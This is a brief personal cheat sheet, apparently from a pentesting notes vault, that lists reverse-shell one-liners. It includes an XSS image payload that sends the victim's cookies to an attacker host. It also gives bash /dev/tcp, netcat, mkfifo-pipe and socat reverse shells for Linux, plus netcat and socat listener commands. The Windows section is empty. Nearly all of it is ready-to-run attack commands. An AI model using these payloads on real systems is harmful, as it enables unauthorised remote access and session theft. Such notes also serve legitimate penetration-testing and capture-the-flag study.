---
tags:
  - reverse-shell
---
[All-in-one resource](https://www.revshells.com/) 

HTTP:
```http
<img src=x onerror=fetch('http://IP:PORT/'+document.cookie);>
```

### Linux:
```bash
bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'

nc -e /bin/sh IP PORT

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT
```

> The [pty module](https://docs.python.org/2/library/pty.html) let’s you spawn a pseudo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal.

### Windows

# Listen

```Shell
$ socat file:`tty`,raw,echo=0 tcp-listen:PORT
$ nc -nlvp PORT
```

Once we get a shell, we can try to [[Upgrade Shell]]